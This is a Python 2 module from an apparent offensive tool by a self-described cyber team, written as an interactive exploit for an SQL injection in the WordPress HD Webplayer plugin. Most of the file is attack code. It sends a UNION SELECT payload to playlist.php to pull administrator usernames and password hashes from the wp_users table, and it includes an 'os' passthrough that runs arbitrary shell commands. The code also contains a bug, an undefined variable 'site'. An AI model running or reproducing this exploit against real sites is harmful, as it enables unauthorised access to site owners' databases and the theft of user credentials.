# -*- coding: utf-8 -*-

'''
Wordpress HD_WebPlayer Sql Injection
Coded By ./Xi4u7
AndroSec1337 Cyber Team
https://facebook.com/Xi4u7
'''
import os
import subprocess
from core.wcolors import color
from core import help
from time import sleep
from core import log
from core import wcolors
from core import about
import requests
import re
options = ["http://test.com/"]

def hd():
	try:
		line_1 = color.RED + "[" + color.CYAN + "XioChi" + color.RED + "]" +  color.ENDC
		line_1 += color.RED + "[" + color.CYAN + "wordpress/hdwebplayersql" + color.RED + "]>> " + color.ENDC
		com = raw_input(line_1)
		com = com.lower()
		if com[0:10] =='set target':
			target_ip = com[11:40]
			options[0] = target_ip
			print color.RED + "[" + color.CYAN + "Target" + color.RED + "]>> " + options[0]
			dwnm()
		elif com[0:12] =='show options':
			print ""
			print wcolors.color.CYAN+"Options\t\t Value\t\t\tRQ\t Description"
			print wcolors.color.RED+"---------\t--------------\t\t------------------"
			print wcolors.color.CYAN+"Target\t\t"+options[0]+"\tyes\tTarget ip addres"
			dwnm()
		elif com[0:2] =='os':
			log.logger.single("Command Executed", "\n"+color.CYAN)
			os.system(com[3:])
			dwnm()
		elif com[0:4] =='help':
			help.help()
			dwnm()
		elif com[0:4] =='back':
			pass
		elif com[0:5] =='about':
			about.about()
			dwnm()
		elif com[0:3] =='run':
			log.logger.attack('Wordpress HD Web Player SQL Injection')
			url = options[0]
			try:
				check = requests.get(url + '/wp-content/plugins/hd-webplayer/playlist.php', timeout=5)
				if '<?xml version="' in check.text.encode('utf-8'):
					Exploit = '/wp-content/plugins/hd-webplayer/playlist.php?videoid=1+union+select+1,2,concat(user_login,0x3a,user_pass),4,5,6,7,8,9,10,11+from+wp_users--'
					GoT = requests.get(site + Exploit, timeout=5)
					User_Pass = re.findall('<title>(.*)</title>', GoT.text.encode('utf-8'))
					username = User_Pass[1].split(':')[0]
					password = User_Pass[1].split(':')[1]
					log.logger.attacksukses("Vulnerable!")
					log.logger.attacksukses("Username : "+str(username))
					log.logger.attacksukses("Password : "+str(password))
				else:
					log.logger.error("Not Vulnerable")
			except:
				log.logger.error("Not Vulnerable")
		else:
			print color.RED + "[" + color.CYAN + "Wrong Command" + color.RED + "]>>" + com
			dwnm()
	except(KeyboardInterrupt):
		print ""
